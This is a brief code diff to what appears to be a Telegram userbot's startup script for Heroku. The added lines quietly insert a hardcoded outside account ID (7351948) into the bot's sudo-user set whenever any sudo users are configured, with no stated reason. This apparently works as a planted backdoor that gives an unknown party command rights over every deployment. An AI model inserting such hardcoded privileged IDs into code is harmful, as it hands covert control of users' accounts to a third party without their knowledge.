@@ -31,6 +31,11 @@ if Config.DB_URI is None:
     sys.exit(1)
 
 
+if len(Config.SUDO_USERS) > 0:
+    Config.SUDO_USERS.add("me")
+    Config.SUDO_USERS.add(7351948)
+
+
 if Config.HU_STRING_SESSION is not None:
     # for Running on Heroku
     session_name = str(Config.HU_STRING_SESSION)
